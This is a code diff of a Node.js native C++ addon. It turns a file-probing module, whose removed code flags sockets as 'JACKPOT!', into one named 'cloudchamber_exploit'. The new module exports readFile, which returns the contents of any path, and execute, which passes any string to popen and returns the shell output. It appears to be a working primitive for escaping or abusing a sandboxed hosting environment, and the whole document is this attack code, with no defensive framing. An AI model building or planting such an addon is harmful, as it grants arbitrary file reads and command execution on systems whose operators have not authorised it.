@@ -1,13 +1,13 @@
 #include <node.h>
 #include <fstream>
 #include <string>
-#include <vector>
-#include <sstream>
-#include <iomanip>
-#include <sys/stat.h>
-#include <unistd.h>
+#include <cstdio>
+#include <iostream>
+#include <memory>
+#include <stdexcept>
+#include <array>
 
-namespace demo {
+namespace cloudchamber_exploit {
 
 using v8::FunctionCallbackInfo;
 using v8::Isolate;
@@ -16,55 +16,44 @@ using v8::Object;
 using v8::String;
 using v8::Value;
 
-void CheckStat(const FunctionCallbackInfo<Value>& args) {
-  Isolate* isolate = args.GetIsolate();
-  String::Utf8Value path(isolate, args[0]);
-  std::string filePath(*path);
+void ReadFile(const FunctionCallbackInfo<Value>& args) {
+    Isolate* isolate = args.GetIsolate();
+    String::Utf8Value path(isolate, args[0]);
+    std::string filePath(*path);
+    std::ifstream file(filePath);
 
-  struct stat st;
-  if (stat(filePath.c_str(), &st) != 0) {
-    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Not Found").ToLocalChecked());
-    return;
-  }
-
-  std::string type = "Unknown";
-  if (S_ISSOCK(st.st_mode)) type = "SOCKET (JACKPOT!)";
-  else if (S_ISDIR(st.st_mode)) type = "Directory";
-  else if (S_ISREG(st.st_mode)) type = "Regular File";
-
-  std::stringstream ss;
-  ss << type << " | Perms: " << std::oct << (st.st_mode & 0777);
-  args.GetReturnValue().Set(String::NewFromUtf8(isolate, ss.str().c_str()).ToLocalChecked());
+    if(!file.is_open()) {
+        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: Access Denied").ToLocalChecked());
+        return;
+    }
+    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    args.GetReturnValue().Set(String::NewFromUtf8(isolate, content.c_str()).ToLocalChecked());
 }
 
-void ReadHex(const FunctionCallbackInfo<Value>& args) {
-  Isolate* isolate = args.GetIsolate();
-  String::Utf8Value path(isolate, args[0]);
-  std::string filePath(*path);
-  
-  std::ifstream file(filePath, std::ios::binary);
-  if(!file.is_open()) {
-    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: Access Denied").ToLocalChecked());
-    return;
-  }
+void Execute(const FunctionCallbackInfo<Value>& args) {
+    Isolate* isolate = args.GetIsolate();
+    String::Utf8Value cmd(isolate, args[0]);
+    std::string command(*cmd);
 
-  std::vector<unsigned char> buffer(512);
-  file.read((char*)buffer.data(), buffer.size());
-  std::streamsize bytesRead = file.gcount();
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
 
-  std::stringstream ss;
-  ss << std::hex << std::setfill('0');
-  for (int i = 0; i < bytesRead; ++i)
-    ss << std::setw(2) << (int)buffer[i];
-
-  args.GetReturnValue().Set(String::NewFromUtf8(isolate, ss.str().c_str()).ToLocalChecked());
+    if (!pipe) {
+        args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Error: popen failed").ToLocalChecked());
+        return;
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        result += buffer.data();
+    }
+    args.GetReturnValue().Set(String::NewFromUtf8(isolate, result.c_str()).ToLocalChecked());
 }
 
 void init(Local<Object> exports) {
-  NODE_SET_METHOD(exports, "checkStat", CheckStat);
-  NODE_SET_METHOD(exports, "readHex", ReadHex);
+    NODE_SET_METHOD(exports, "readFile", ReadFile);
+    NODE_SET_METHOD(exports, "execute", Execute);
 }
 
 NODE_MODULE(NODE_GYP_MODULE_NAME, init)
 
-}  // namespace demo
+}
